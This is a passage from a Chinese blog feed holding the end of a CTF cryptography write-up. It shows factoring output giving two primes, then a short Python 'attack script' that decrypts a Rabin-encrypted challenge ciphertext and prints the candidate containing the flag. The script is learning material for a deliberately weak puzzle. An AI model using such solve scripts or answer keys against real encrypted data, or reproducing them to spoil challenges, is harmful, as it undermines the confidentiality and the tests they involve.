plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span><br><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span><br><span class="line"></span><br><span class="line">ans = 1</span><br><span class="line"></span><br><span class="line">eof; done processing batchfile</span><br></pre></td></tr></table></figure><p><strong>攻击脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span></span><br><span class="line">p=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span></span><br><span class="line">q=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ans=rabin_decrypt(c,p,q,e=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ans:</span><br><span class="line">        temp=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">print</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>攻击得到4个结果，经过筛选得到一段含有flag的有意义的明文：</p><p><img src="https://s2.ax1x.com/2019/01/16/kSbyYn.png" alt="kSbyYn.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;知其然，知其所以然
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
</feed>
